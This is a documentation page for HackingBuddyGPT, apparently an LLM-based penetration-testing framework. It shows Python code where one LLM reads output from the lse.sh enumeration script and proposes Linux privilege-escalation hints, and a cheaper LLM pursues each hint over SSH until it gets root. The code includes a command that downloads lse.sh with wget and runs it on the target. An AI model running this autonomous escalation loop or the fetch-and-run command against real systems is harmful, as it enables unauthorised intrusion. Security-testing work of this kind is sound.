---
title: Using multiple LLMs
nextjs:
  metadata:
    title: Using multiple LLMs
    description: "HackingBuddyGPT: Sometimes you want to mix-and-match multiple LLMs due to their differences in costs or runtime. How to achieve that?"
---

Sometimes you want to mix-and-match multiple LLMs due to their differences in costs or runtime. How to achieve that?

```python
@use_case("linux_privesc_guided", "Linux Privilege Escalation using lse.sh for initial guidance")
@dataclass
class PrivescWithLSE(UseCase, abc.ABC):
    conn: SSHConnection = None
    system: str = ''
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False

    # all of these would typically be set by RoundBasedUseCase :-/
    # but we need them here so that we can pass them on to the inner
    # use-case
    log_db: DbStorage = None
    console: Console = None
    llm: OpenAIConnection = None
    tag: str = ""
    max_turns: int = 10
    low_llm: OpenAIConnection = None

    def init(self):
        super().init()

    # simple helper that uses lse.sh to get hints from the system
    def read_hint(self):
        
        self.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, got_root = SSHRunCommand(conn=self.conn)(run_cmd, timeout=120)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return cmd.result

    def run(self):
        # read the hint
        hint = self.read_hint()

        for i in hint.splitlines():
            self.console.print("[green]Now using Hint: " + i)
         
            # call the inner use-case
            priv_esc = LinuxPrivesc(
                conn=self.conn, # must be set in sub classes
                enable_explanation=self.enable_explanation,
                disable_history=self.disable_history,
                hint=i,
                log_db = self.log_db,
                console = self.console,
                llm = self.low_llm,
                tag = self.tag + "_hint_" +i,
                max_turns = self.max_turns
            )

            priv_esc.init()
            if priv_esc.run():
                # we are root! w00t!
                return True
```